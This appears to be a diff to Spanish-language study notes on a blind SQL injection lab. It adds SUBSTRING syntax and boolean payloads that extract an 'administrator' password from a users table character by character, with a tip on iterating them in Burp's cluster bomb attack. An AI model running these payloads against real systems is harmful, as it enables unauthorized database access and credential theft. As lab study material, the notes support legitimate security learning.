@@ -83,9 +83,32 @@ Para el segundo query caracter ya da false porque el numero es 20 no mayor a 20
 
 ## Paso 5
 
+***Substring sintaxis***
+
+```
+SUBSTRING(EXPRESION(COLUMNA),POSICION(EMPIEZA EN 1),LENGTH).
+
+```
+
 Se utiliza substring para sacar los datos las posiciones empienzan index 1.
 
 
 ```
 'and (select substring(password,1,1) from users where username='administrator')='a'--
 ```
+
+Se puede usar el ataque cluster Bomb pero solo en Burp Pro 
+iteraria sobre los cambpos (select substring(password,*,1) y where username='administrator')='*'
+
+
+```
+'and (select substring(password,2,1) from users where username='administrator')='a'--
+
+'and (select substring(password,2,1) from users where username='administrator')='$a$'--
+```
+
+
+Asi uno por uno iria iterando para sacar el password.
+
+
+
